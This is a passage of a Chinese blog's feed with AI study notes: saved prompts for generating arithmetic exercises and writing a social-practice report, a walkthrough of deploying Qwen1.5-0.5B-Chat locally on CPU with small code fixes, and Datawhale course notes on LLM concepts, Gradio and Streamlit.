<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 角色</span><br><span class="line">你扮演一位经验丰富的程序员，根据用户的需求帮助用户完成业务功能开发。</span><br><span class="line"></span><br><span class="line"># 需求</span><br><span class="line">我需要开发一个根据年级生成算术题的接口。</span><br><span class="line">参数：年级，可以是一年级或二年级</span><br><span class="line">返回值：100道算术题</span><br><span class="line"></span><br><span class="line">一年级算术题包含3种类型：</span><br><span class="line">- 100以内的加法</span><br><span class="line">- 100以内的减法</span><br><span class="line">- 100以内3个数字的加减混合运算</span><br><span class="line"></span><br><span class="line">二年级算术题包含类型：</span><br><span class="line">- 表内乘法、除法</span><br><span class="line">- 加减乘除混合运算，运算数字为3个数，加减运算数字不超过100，乘除必须是表内乘除法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>感觉这个需求不错，我家确实有小孩需要这个</p>
<p>或许可以作为这个博客的学习项目^ ^?</p>
</div>]]></content>
      <categories>
        <category>notes</category>
        <category>AI notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>【AI】一些专门编写的Prompt保存</title>
    <url>/2024/09/01/CS_Notes/AI/%E3%80%90AI%E3%80%91%E4%B8%80%E4%BA%9B%E4%B8%93%E9%97%A8%E7%BC%96%E5%86%99%E7%9A%84Prompt%E4%BF%9D%E5%AD%98/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 角色</span><br><span class="line">你是一位经验丰富的社会实践报告撰写师，可以从分析社会实践内容及日常、分析社会实践内容给实践者带来的积极影响、分析社会实践内容给实践者产生的心得体会等方面为用户提供专业的不少于5000字的社会实践报告的完全撰写</span><br><span class="line"></span><br><span class="line">## 技能</span><br><span class="line">### 技能1：收集信息和需求分析</span><br><span class="line">- 收集和分析用户社会实践的具体内容，根据内容，设计实践报告的层次划分</span><br><span class="line">- 确定社会实践内容的优先级和重要性，为用户撰写特定部分的社会实践报告内容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 技能2：社会实践内容及日程整理</span><br><span class="line">- 根据用户提供的社会实践报告结构，确定各个部分需要撰写的内容的大致方向</span><br><span class="line">- 输出格式 ：</span><br><span class="line">	- </span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">### 技能3：社会实践内容总结</span><br><span class="line">- 根据用户提供的简易社会实践总结，从不同角度深入扩展。</span><br><span class="line">- 输出：分点文字内容。</span><br><span class="line">	- &lt;序号&gt;、&lt;内容总结分点标题&gt;</span><br><span class="line">		- &lt;内容总结分点内容&gt;</span><br><span class="line">		- (可选)&lt;内容总结小分点内容&gt;</span><br><span class="line">		</span><br><span class="line">	- （在以上分点内容全部完成后）&lt;最后一段进行总结性的归纳概括&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 技能4：社会实践心得体会撰写</span><br><span class="line">- 理解社会实践中具体工作任务内容，从中分析用户可能产生的心得体会，</span><br><span class="line">- 获得的心得体会从多个角度入手，进行分点</span><br><span class="line">- 输出：分点文字内容。</span><br><span class="line">	- &lt;序号&gt;、&lt;心得体会分点标题&gt;</span><br><span class="line">		- &lt;心得体会分点内容&gt;</span><br><span class="line">		- (可选)&lt;心得体会小分点内容&gt;</span><br><span class="line">		</span><br><span class="line">	- （在以上分点内容全部完成后）&lt;最后一段进行总结性的心得体会归纳概括&gt;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Workflow</span><br><span class="line">1. **确认需求：**使用技能1，根据用户提供的社会实践日志内容，通过需求分析确定社会实践报告内容模块划分和社会实践报告维度分析</span><br><span class="line">2. **维度分析：**我从多个维度分析需求文档，并提供补充建议</span><br><span class="line">3. **业务数据字段：**我将输出业务数据字段，并提供详细说明</span><br><span class="line">4. **其他思考和补充：**我将输出更多关于</span><br><span class="line"></span><br><span class="line">## 限制</span><br><span class="line">- 只处理与需求文档相关的内容</span><br><span class="line">- 对于需要扩展的内容，尽可能联系所提供的内容进行发散思考</span><br><span class="line">- 确保输出内容准确、逻辑严谨、格式规范</span><br><span class="line">- 内容长度严格遵循设定的：不少于5000字</span><br><span class="line">- 对于不明确或确缺失的信息，将向您询问或提出建议</span><br><span class="line">- 对于可能可以拓展的内容，向用户提供并寻求建议</span><br><span class="line">- 不可以照搬提供的内容，需要有自己的思考。关于计算机、计算机硬件、电气维修、业务合作、客户沟通等方面，根据提供材料进行5000字的社会实践报告的撰写</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 社会实践报告结构</span><br><span class="line">一、实践人员简介</span><br><span class="line">&lt;这部分已有内容，可跳过&gt;</span><br><span class="line">二、实践内容及日程</span><br><span class="line">&lt;实践内容及日程&gt;</span><br><span class="line">三、社会实践总结</span><br><span class="line">&lt;社会实践总结&gt;</span><br><span class="line">四、学生心得体会</span><br><span class="line">&lt;学生心得体会&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 社会实践日程表</span><br><span class="line">8月1日-上午-熟悉维修店环境，了解各类家用电器和电脑配件</span><br><span class="line">8月1日-下午-学习基本的故障诊断方法和工具使用</span><br><span class="line">8月3日-上午-尝试电脑配件的拆卸和清洁</span><br><span class="line">8月3日-下午-学习电脑配件的检测</span><br><span class="line">8月5日-上午-参与实际的电脑维修工作，观察并学习维修流程</span><br><span class="line">8月5日-下午-学习电脑配件的更换流程和注意事项</span><br><span class="line">8月7日-上午-继续实践电脑维修，尝试独立完成简单的维修任务</span><br><span class="line">8月7日-下午-学习客户服务和沟通技巧</span><br><span class="line">8月9日-上午-观察与尝试复杂电脑维修任务</span><br><span class="line">8月9日-下午-复习和巩固前几日所学知识</span><br><span class="line">8月11日-上午-独立完成部分电脑维修任务，包括故障诊断，配件更换</span><br><span class="line">8月11日-下午-与员工交流经验，学习更多维修技巧</span><br><span class="line">8月13日-上午-总结一周所学并撰写报告</span><br><span class="line">8月13日-下午-与店主和同事进行反馈交流，讨论学习成果</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 社会实践总结</span><br><span class="line">&lt;这部分是我自己随便总结的，需要你对其中内容进行进一步深化和扩展，使内容更加全面&gt;</span><br><span class="line">通过在电器维修店的两周实践，了解家用电器和电脑的维修流程; 学习如何识别和诊断故障;实践了电脑硬件的拆卸、清洁和组装;掌握使用专业工具进行检测和唯修的技能:提高了实践能力和客产沟通能力。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>notes</category>
        <category>AI notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>【AI】本地大模型部署（低配可实现）</title>
    <url>/2024/09/07/CS_Notes/AI/%E3%80%90AI%E3%80%91%E6%9C%AC%E5%9C%B0%E5%A4%A7%E6%A8%A1%E5%9E%8B%E9%83%A8%E7%BD%B2%EF%BC%88%E4%BD%8E%E9%85%8D%E5%8F%AF%E5%AE%9E%E7%8E%B0%EF%BC%89/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>部署过程的简单记录！</li>
<li>本次部署主要基于：<a href="https://blog.csdn.net/Only_AR/article/details/138321726?ops_request_misc=%7B%22request%5Fid%22%3A%22B836C92D-522F-464D-8420-AC219FE6E3E5%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=B836C92D-522F-464D-8420-AC219FE6E3E5&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-5-138321726-null-null.142%5Ev100%5Epc_search_result_base2&amp;utm_term=%E7%AC%94%E8%AE%B0%E6%9C%AC%E9%83%A8%E7%BD%B2%E5%A4%A7%E6%A8%A1%E5%9E%8B&amp;spm=1018.2226.3001.4187">大模型的本机部署_本地部署大模型-CSDN博客</a>，以下简称这篇文章为【博客】，方便应用</li>
<li>主要部署步骤参考【博客】，此处仅记录部分需改动内容</li>
<li>大致环境：
<ul>
<li>Windows</li>
<li>无N卡，CPU部署</li>
<li>内存大致消耗：5G±</li>
</ul>
</li>
</ul>
<h3 id="环境准备"><a class="header-anchor" href="#环境准备">¶</a>环境准备</h3>
<h4 id="创建和激活conda环境"><a class="header-anchor" href="#创建和激活conda环境">¶</a>创建和激活conda环境</h4>
<ul>
<li>步骤同博客的==2 环境配置==  不过我选的<code>python</code>版本是3.10</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create -n llm-chat python=3.10</span><br><span class="line"></span><br><span class="line">conda activate llm-chat</span><br></pre></td></tr></table></figure>
<h4 id="安装pytorch"><a class="header-anchor" href="#安装pytorch">¶</a>安装pytorch</h4>
<ul>
<li>这里我选的是CPU对应安装方式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install torch torchvision torchaudio</span><br></pre></td></tr></table></figure>
<ul>
<li>安装完<code>pytorch</code>就直接跳到博客步骤==2.4== 拉取仓库步骤</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/OnlyAR/nano-ai-chat.git</span><br></pre></td></tr></table></figure>
<ul>
<li>需要魔法hhh</li>
</ul>
<h4 id="安装依赖"><a class="header-anchor" href="#安装依赖">¶</a>安装依赖</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd nano-ai-chat</span><br><span class="line"></span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>此处建议：在<code>pycharm</code>终端进行后续流程</li>
<li>因为<code>pycharm</code>有时候会弹出来提醒，哪几个依赖没有安装</li>
<li>未解之谜：有几个依赖，例如<code>modelscope</code> <code>llmtuner</code> 安装好几次失败，然后再安装就莫名其妙成功了……</li>
</ul>
<h3 id="模型下载"><a class="header-anchor" href="#模型下载">¶</a>模型下载</h3>
<ul>
<li>此处我选了Qwen1.5-0.5B-Chat（低配orz</li>
<li>以后配置好了就选7B的！！！</li>
</ul>
<blockquote>
<p>原博客提示：</p>
<p>只有模型名字里带有 Chat 的才是对话模型，否则是基础模型，只能续写句子不能对话。模型的 <code>-xB-</code> 表示参数量，1B 表示十亿，CPU 玩家建议用 0.5B 或 1.8B 试试</p>
</blockquote>
<ul>
<li>将模型下载到本地</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python download.py --model qwen/Qwen1.5-0.5B-Chat</span><br></pre></td></tr></table></figure>
<blockquote>
<p>原博客提示：</p>
<p>对于上表里有的模型，<code>--model</code> 参数请填写 path，没有的模型可以去主页查。脚本默认将模型下载到当前目录下的 <code>model</code> 文件夹，可以通过 <code>--output</code> 参数修改</p>
</blockquote>
<h3 id="代码微调（本文新增）"><a class="header-anchor" href="#代码微调（本文新增）">¶</a>代码微调（本文新增）</h3>
<ul>
<li><code>web_demo.py</code>  本地Web端启动模型对应文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># web_demo.py</span></span><br><span class="line"><span class="keyword">from</span> llmtuner.webui.interface <span class="keyword">import</span> create_web_demo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    create_web_demo().queue().launch(</span><br><span class="line">        server_name=<span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">        server_port=<span class="literal">None</span>,</span><br><span class="line">        share=<span class="literal">False</span>,</span><br><span class="line">        inbrowser=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<ul>
<li>原来<code>from llmtuner.webui.interface import create_web_demo</code>这一行是<code>from llmtuner import create_web_demo</code></li>
<li>反复pip好几次<code>llmtuner</code>还是报错，显示找不到<code>create_web_demo</code>，b溃的很</li>
<li>幸好<code>pycharm</code>的报错提示还有建议修复的功能，遂更改，然后可以运行</li>
<li>以下命令行方式对应py文件<code>cli_demo.py</code>同理</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> llmtuner.chat <span class="keyword">import</span> ChatModel</span><br><span class="line"><span class="keyword">from</span> llmtuner.extras.misc <span class="keyword">import</span> torch_gc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> platform.system() != <span class="string">&quot;Windows&quot;</span>:</span><br><span class="line">        <span class="keyword">import</span> readline  <span class="comment"># noqa: F401</span></span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Install `readline` for a better experience.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    chat_model = ChatModel()</span><br><span class="line">    messages = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the CLI application, use `clear` to remove the history, use `exit` to exit the application.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            query = <span class="built_in">input</span>(<span class="string">&quot;\nUser: &quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Detected decoding error at the inputs, please set the terminal encoding to utf-8.&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query.strip() == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query.strip() == <span class="string">&quot;clear&quot;</span>:</span><br><span class="line">            messages = []</span><br><span class="line">            torch_gc()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;History has been removed.&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: query&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Assistant: &quot;</span>, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        response = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> new_text <span class="keyword">in</span> chat_model.stream_chat(messages):</span><br><span class="line">            <span class="built_in">print</span>(new_text, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            response += new_text</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: response&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<ul>
<li>以上两个关键文件的依赖导入部分微调完毕</li>
</ul>
<h3 id="启动模型"><a class="header-anchor" href="#启动模型">¶</a>启动模型</h3>
<ul>
<li>Web 端</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python web_demo.py --model_name_or_path model/qwen/Qwen1___5-0___5B-Chat --template qwen</span><br></pre></td></tr></table></figure>
<ul>
<li>命令行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cli_demo.py --model_name_or_path model/qwen/Qwen1___5-0___5B-Chat --template qwen</span><br></pre></td></tr></table></figure>
<h3 id="完事"><a class="header-anchor" href="#完事">¶</a>完事</h3>
]]></content>
      <categories>
        <category>notes</category>
        <category>AI notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>【DataWhale--大模型应用开发】动手学大模型应用全栈开发</title>
    <url>/2024/08/11/CS_Notes/AI/%E3%80%90DataWhale--%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E3%80%91%E5%8A%A8%E6%89%8B%E5%AD%A6%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BA%94%E7%94%A8%E5%85%A8%E6%A0%88%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>
<p><a href="https://linklearner.com/activity/14/11/25">Datawhale (linklearner.com)</a>   动手学大模型应用全栈开发</p>
</li>
<li>
<p><strong>学习内容提要</strong>：通过学习大模型部署【搭建你的智能编程助手】、大模型检索增强生成（Retrieval Augmented Generation, RAG）实战【搭建你的AI科研助手】、大模型微调实战【搭建你的AI简历助手】，掌握大模型应用全栈开发</p>
</li>
</ul>
<h3 id="背景知识"><a class="header-anchor" href="#背景知识">¶</a>背景知识</h3>
<h4 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h4>
<ul>
<li>
<p>为了对人类语言的内在规律进行建模，研究者们提出使用语言模型（language model）来准确预测词序列中 <code>下一个词</code> 或者 <code>缺失的词</code> 的概率</p>
</li>
<li>
<p>大语言模型（Large Language Model, LLM）：基于“扩展法则”（Scaling Law），即通过增加模型参数或训练数据，可以提升下游任务的性能，同时具有小模型不具有的“涌现能力”（Emergent Abilities）。代表性工作：GPT-3、ChatGPT、Claude、Llama</p>
</li>
</ul>
<h4 id="构建过程"><a class="header-anchor" href="#构建过程">¶</a>构建过程</h4>
<ul>
<li>大模型的构建过程可以分为**<u>预训练</u><strong>（Pretraining）、</strong><u>有监督微调</u><strong>（Supervised Fine-tuning, SFT）、</strong><u>基于人类反馈的强化学习对齐</u>**（Reinforcement Learning from Human Feedback, RLHF）三个阶段</li>
</ul>
<h5 id="预训练"><a class="header-anchor" href="#预训练">¶</a>预训练</h5>
<ul>
<li>预训练指使用海量的数据进行模型参数的初始学习，旨在为模型参数寻找到一个优质的“起点”</li>
</ul>
<h5 id="有监督微调"><a class="header-anchor" href="#有监督微调">¶</a>有监督微调</h5>
<ul>
<li>经过大规模预训练后，模型已经具备较强的模型能力，能够编码丰富的世界知识</li>
<li>但是由于预训练任务形式所限，这些模型更<u>擅长于文本补全</u>，并不适合直接解决具体的任务</li>
<li>该方法利用<u>成对的任务输入与预期输出数据</u>，训练模型学会以问答的形式解答问题，从而解锁其任务解决潜能</li>
<li>指令微调并非无中生有地传授新知，而是更多地扮演着<u>催化剂</u>的角色，激活模型内在的潜在能力，而非单纯地灌输信息</li>
</ul>
<h5 id="基于人类反馈的强化学习对齐–RLHF"><a class="header-anchor" href="#基于人类反馈的强化学习对齐–RLHF">¶</a>基于人类反馈的强化学习对齐–RLHF</h5>
<ul>
<li>核心：构建一个反映人类价值观的奖励模型（Reward Model）</li>
<li>这一模型的训练依赖于专家对模型多种输出的<u>偏好排序</u>，通过偏好数据训练出的奖励模型能够有效评判模型输出的质量</li>
</ul>
<h5 id="示例：开源大模型Llama-2-Chat训练过程"><a class="header-anchor" href="#示例：开源大模型Llama-2-Chat训练过程">¶</a>示例：开源大模型Llama-2-Chat训练过程</h5>
<ul>
<li>起始：利用公开数据进行预训练，获得Llama-2</li>
<li>此后：通过有监督微调创建了Llama-2-Chat的初始版本</li>
<li>随后：使用基于人类反馈的强化学习（RLHF）方法来迭代地改进模型
<ul>
<li>具体包括：
<ul>
<li>拒绝采样（Rejection Sampling）</li>
<li>近端策略优化（Proximal Policy Optimization, PPO）</li>
</ul>
</li>
<li>RLHF阶段，人类偏好数据也在并行迭代，以保持奖励模型的更新</li>
</ul>
</li>
</ul>
<h3 id="开源大模型和闭源大模型"><a class="header-anchor" href="#开源大模型和闭源大模型">¶</a>开源大模型和闭源大模型</h3>
<ul>
<li>构建大模型不仅需要<strong>海量的数据</strong>，更依赖于<strong>强大的计算能力</strong></li>
<li>两类机构：
<ul>
<li><strong>一是选择将模型开源的组织</strong>
<ul>
<li>代表：Meta AI、浪潮信息</li>
</ul>
</li>
<li><strong>另一类则是保持模型闭源的公司</strong>
<ul>
<li>通常伴随着专有技术和服务</li>
<li>企业可以通过API等方式提供给客户使用</li>
<li>不直接公开模型的细节或代码</li>
<li>代表：OpenAI、百度等</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="源大模型开源体系"><a class="header-anchor" href="#源大模型开源体系">¶</a>源大模型开源体系</h4>
<ul>
<li>浪潮信息已经发布了三个大模型：<code>源1.0</code> ，<code>源2.0</code> 和 <code>源2.0-M32</code></li>
<li>其中 <code>源1.0</code> 开放了模型API、高质量中文数据集和代码
<ul>
<li><a href="https://github.com/Shawn-IEITSystems/Yuan-1.0">项目链接: https://github.com/Shawn-IEITSystems/Yuan-1.0</a></li>
<li><a href="https://mp.weixin.qq.com/s/6CH0I4eOLzj3YDZyIxdeEQ">官方报道: https://mp.weixin.qq.com/s/6CH0I4eOLzj3YDZyIxdeEQ</a></li>
<li><a href="https://arxiv.org/abs/2110.04725">论文链接: https://arxiv.org/abs/2110.04725</a></li>
</ul>
</li>
<li><code>源2.0</code> 和 <code>源2.0-M32</code> 采用全面开源策略，全系列模型参数和代码均可免费下载使用
<ul>
<li>源2.0提出了局部注意力过滤增强机制（Localized Filtering-based Attention, LFA），它假设自然语言相邻词之间有更强的语义关联，因此针对局部依赖进行了建模，最后使得模型精度提高3.53%
<ul>
<li><a href="https://github.com/IEIT-Yuan/Yuan-2.0">项目链接: https://github.com/IEIT-Yuan/Yuan-2.0</a></li>
<li><a href="https://mp.weixin.qq.com/s/rjnsUS83TT7aEN3r2i0IPQ">官方报道: https://mp.weixin.qq.com/s/rjnsUS83TT7aEN3r2i0IPQ</a></li>
<li><a href="https://arxiv.org/abs/2311.15786">论文链接: https://arxiv.org/abs/2311.15786</a></li>
</ul>
</li>
<li>源2.0-M32发布，它是一个混合专家（Mixture of Experts, MoE）大模型
<ul>
<li>包含32个专家，基于LFA+Attention Router的MoE模型结构</li>
<li>在数理逻辑、代码生成、知识等方面精度对标Llama3-70B，推理算力降至1/19</li>
<li><a href="https://github.com/IEIT-Yuan/Yuan2.0-M32">项目链接: https://github.com/IEIT-Yuan/Yuan2.0-M32</a></li>
<li><a href="https://mp.weixin.qq.com/s/WEVyYq9BkTTlO6EAfiCf6w">官方报道: https://mp.weixin.qq.com/s/WEVyYq9BkTTlO6EAfiCf6w</a></li>
<li><a href="https://arxiv.org/abs/2405.17976">论文链接: https://arxiv.org/abs/2405.17976</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="大模型时代挖掘模型能力的开发范式"><a class="header-anchor" href="#大模型时代挖掘模型能力的开发范式">¶</a>大模型时代挖掘模型能力的开发范式</h3>
<h4 id="1-Prompt工程"><a class="header-anchor" href="#1-Prompt工程">¶</a>1. Prompt工程</h4>
<ul>
<li>精心构造提示（Prompt），直接调教大模型，解决实际问题</li>
</ul>
<h5 id="两种技术"><a class="header-anchor" href="#两种技术">¶</a>两种技术</h5>
<ul>
<li><strong><u>上下文学习</u></strong>（In-Context Learning, ICL）：将任务说明及示例融入提示文本之中，利用模型自身的归纳能力，无需额外训练即可完成新任务的学习</li>
<li><strong><u>思维链提示</u></strong>（Chain-of-Thought, CoT）：引入连贯的逻辑推理链条至提示信息内，显著增强了模型处理复杂问题时的解析深度与广度</li>
</ul>
<h4 id="2-Embedding辅助，给LLM外界大脑"><a class="header-anchor" href="#2-Embedding辅助，给LLM外界大脑">¶</a>2. Embedding辅助，给LLM外界大脑</h4>
<h5 id="大模型的若干局限性"><a class="header-anchor" href="#大模型的若干局限性">¶</a>大模型的若干局限性</h5>
<ul>
<li><u><strong>知识局限性</strong></u>：大模型的知识来源于训练数据，而这些数据主要来自于互联网上已经公开的资源，对于一些<u>实时性</u>的或者<u>非公开</u>的，由于大模型没有获取到相关数据，这部分知识也就无法被掌握。</li>
<li><strong><u>数据安全性</u></strong>：为了使得大模型能够具备相应的知识，就需要将数据纳入到训练集进行训练。然而，对于企业来说，数据的安全性至关重要，任何形式的<u>数据泄露</u>都可能对企业构成致命的威胁。</li>
<li><strong><u>大模型幻觉</u></strong>：由于大模型是基于<u>概率统计</u>进行构建的，其输出本质上是<u>一系列数值运算</u>。因此，有时会出现模型“一本正经地胡说八道”的情况，尤其是在大模型不具备的知识或不擅长的场景中。</li>
</ul>
<h4 id="3-参数高效微调"><a class="header-anchor" href="#3-参数高效微调">¶</a>3. 参数高效微调</h4>
<ul>
<li>也被称为指令微调（Instruction Tuning）或者有监督微调（Supervised Fine-tuning, SFT）</li>
<li>首先需要构建指令训练数据，然后通过有监督的方式对大模型的参数进行微调。经过模型微调后，大模型能够更好地遵循和执行人类指令，进而完成下游任务</li>
<li>由于大模型的参数量巨大， 进行全量参数微调需要消耗非常多的算力 → 提出了参数高效微调（Parameter-efficient Fine-tuning） /  轻量化微调 （Lightweight Fine-tuning）</li>
<li>方法通过训练极少的模型参数，同时保证微调后的模型表现可以与全量微调相媲美</li>
</ul>
<h3 id="大模型应用开发必知必会"><a class="header-anchor" href="#大模型应用开发必知必会">¶</a>大模型应用开发必知必会</h3>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th>客户端</th>
<th></th>
<th>服务端</th>
</tr>
</thead>
<tbody>
<tr>
<td>用户</td>
<td>请求→</td>
<td>gradio</td>
<td>输入→</td>
<td>大模型API</td>
</tr>
<tr>
<td></td>
<td>←回复</td>
<td>streamlit</td>
<td>←输出</td>
<td>大模型本地部署</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="客户端"><a class="header-anchor" href="#客户端">¶</a>客户端</h4>
<ul>
<li>客户端需要接受用户请求，并且能将回复返回给用户</li>
<li>通常使用 <a href="https://www.gradio.app/">Gradio</a> 和 <a href="https://streamlit.io/">Streamlit</a> 进行开发</li>
</ul>
<h5 id="Gradio"><a class="header-anchor" href="#Gradio">¶</a>Gradio</h5>
<ul>
<li>有<strong>输入输出组件、控制组件、布局组件</strong>几个基础模块</li>
<li><strong>输入输出组件</strong>用于<u>展示</u>内容和<u>获取</u>内容，如：<code>Textbox</code>文本、<code>Image</code>图像</li>
<li><strong>布局组件</strong>用于更好地规划组件的布局，如：<code>Column</code>（把组件放成一列）、<code>Row</code>（把组件放成一行）
<ul>
<li>推荐使用<code>gradio.Blocks()</code>做更多丰富交互的界面，<code>gradio.Interface()</code>只支持单个函数交互</li>
</ul>
</li>
<li><strong>控制组件</strong>用于直接调用函数，无法作为输入输出使用，如：<code>Button</code>（按钮）、<code>ClearButton</code>（清除按钮）</li>
</ul>
<blockquote>
<p>设计哲学:</p>
<p>将输入和输出组件与布局组件分开。</p>
<p>输入组件（如<code>Textbox</code>、<code>Slider</code>等）用于接收用户输入</p>
<p>输出组件（如<code>Label</code>、<code>Image</code>等）用于显示函数的输出结果</p>
<p>布局组件（如<code>Tabs</code>、<code>Columns</code>、<code>Row</code>等）则用于组织和排列这些输入和输出组件，以创建结构化的用户界面</p>
</blockquote>
<ul>
<li>了解更多组件详情： <a href="https://www.gradio.app/guides/quickstart">官方文档</a></li>
<li>设计更复杂的界面风格： <a href="https://www.gradio.app/guides/theming-guide">官方文档：主题</a></li>
</ul>
<h5 id="Streamlit"><a class="header-anchor" href="#Streamlit">¶</a>Streamlit</h5>
<ul>
<li>官网： <a href="https://streamlit.io/">Streamlit</a> 官方</li>
<li><a href="https://streamlit.io/">Streamlit</a> 中没有gradio的输入和输出概念，也没有布局组件的概念</li>
<li>Streamlit每个组件都是独立的，需要用什么直接查看<a href="https://docs.streamlit.io/develop/api-reference">官方文档</a></li>
</ul>
<h6 id="大致组件"><a class="header-anchor" href="#大致组件">¶</a>大致组件</h6>
<ul>
<li><strong>页面元素</strong>
<ul>
<li>文本</li>
<li>数据表格</li>
<li>图标绘制（柱状图，散点图等等）</li>
<li>输入（文本框，按钮，下拉框，滑块，复选框，文件上传，等等）</li>
<li>多媒体（图片，音频，视频）</li>
<li>布局和容器</li>
<li>Chat（聊天对话控件）</li>
<li>状态（进度条，加载中，等等元素）</li>
<li>第三方组件（提供了更加丰富的组件）</li>
</ul>
</li>
<li><strong>应用逻辑</strong>
<ul>
<li>导航和页面（可以切换页面）</li>
<li>执行流程</li>
<li>缓存和状态</li>
<li>连接和加密（可连接数据库，也可以对内容进行加密处理）</li>
<li>自定义组件</li>
<li>公共组件（用户信息存储，帮助，以及输出html）</li>
<li>Config（使用配置文件，来定义一些内容）</li>
</ul>
</li>
<li><strong>工具</strong>
<ul>
<li>应用测试</li>
<li>命令行</li>
</ul>
</li>
</ul>
<h4 id="服务端"><a class="header-anchor" href="#服务端">¶</a>服务端</h4>
<ul>
<li>服务端需要与大模型进行交互，大模型接受到用户请求后，经过复杂的计算，得到模型输出</li>
</ul>
<h5 id="服务端的两种方式"><a class="header-anchor" href="#服务端的两种方式">¶</a>服务端的两种方式</h5>
<h6 id="直接调用大模型API"><a class="header-anchor" href="#直接调用大模型API">¶</a>直接调用大模型API</h6>
<ul>
<li><strong>将请求直接发送给相应的服务商，如openai，讯飞星火等，等待API返回大模型回复</strong></li>
<li>✔️ 优点：
<ol>
<li><strong>便捷性</strong>： 不需要关心模型的维护和更新，服务商通常会负责这些工作。</li>
<li><strong>资源效率</strong>： 避免了本地硬件投资和维护成本，按需付费，灵活调整成本支出。</li>
